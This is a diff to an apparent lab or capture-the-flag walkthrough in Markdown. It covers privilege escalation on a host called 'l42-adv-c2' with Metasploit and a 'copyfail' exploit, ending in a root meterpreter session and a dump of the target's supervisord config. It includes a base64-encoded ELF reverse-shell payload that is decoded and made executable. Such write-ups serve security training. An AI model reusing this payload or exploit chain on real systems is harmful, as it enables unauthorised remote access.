@@ -1478,7 +1478,7 @@ uid=1002(foothold) gid=1002(foothold) groups=1002(foothold)
 ```
 
 ## Privesc
-##### generating the reverse shell, uploading the copyfail exploit
+##### Generating the reverse shell, uploading the copyfail exploit and entering the root meterpreter session
 ```
 ┌──(kali㉿blue-ops)-[~]
 └─$ msfconsole -q       
@@ -1553,7 +1553,7 @@ msf > sessions 2
 meterpreter > 
 
 ```
-#### Uploading the reverse shell and executing the copyfail exploit
+##### Uploading the reverse shell and executing the copyfail exploit
 ```
 foothold@l42-adv-c2:~$ base64 -d <<< "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m" > rev
 foothold@l42-adv-c2:~$ chmod +x rev
@@ -1649,4 +1649,38 @@ cron
 nginx
 
 exec /usr/bin/supervisord -c /etc/supervisor/conf.d/c2.conf
+```
+##### meterpreter > cat /etc/supervisor/conf.d/c2.conf
+```
+meterpreter > cat /etc/supervisor/conf.d/c2.conf 
+[supervisord]
+nodaemon=true
+logfile=/var/log/adv-c2/supervisord.log
+pidfile=/var/run/supervisord.pid
+
+[program:c2-admin]
+command=/usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
+directory=/opt/c2
+user=c2-app
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/adv-c2/c2-admin.log
+stderr_logfile=/var/log/adv-c2/c2-admin.err.log
+
+[program:c2-ingest]
+command=/usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
+directory=/opt/c2
+user=c2-app
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/adv-c2/c2-ingest.log
+stderr_logfile=/var/log/adv-c2/c2-ingest.err.log
+
+[program:sshd]
+command=/usr/sbin/sshd -D -e
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/adv-c2/sshd.log
+stderr_logfile=/var/log/adv-c2/sshd.err.log
+
 ```
